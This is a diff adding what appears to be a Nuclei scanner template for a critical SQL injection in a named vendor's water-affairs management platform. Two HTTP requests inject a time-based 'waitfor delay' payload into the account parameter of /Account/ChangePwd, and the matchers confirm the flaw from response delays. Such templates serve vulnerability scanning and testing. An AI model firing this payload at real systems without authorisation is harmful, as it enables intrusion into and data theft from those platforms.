@@ -1,0 +1,35 @@
+id: swxxgl-account-sqli
+
+info:
+  name: 山东潍微科技股份有限公司水务信息管理平台存在前台SQL注入
+  author: HB
+  severity: critical
+
+http:
+  - raw:
+    - |
+      GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=test%27;waitfor%20delay%20%270:0:0%27--+ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+    
+    - |
+      GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=test%27;waitfor%20delay%20%270:0:5%27--+ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=0 && duration_1<=1"
+          - "duration_2>=5 && duration_2<=6"
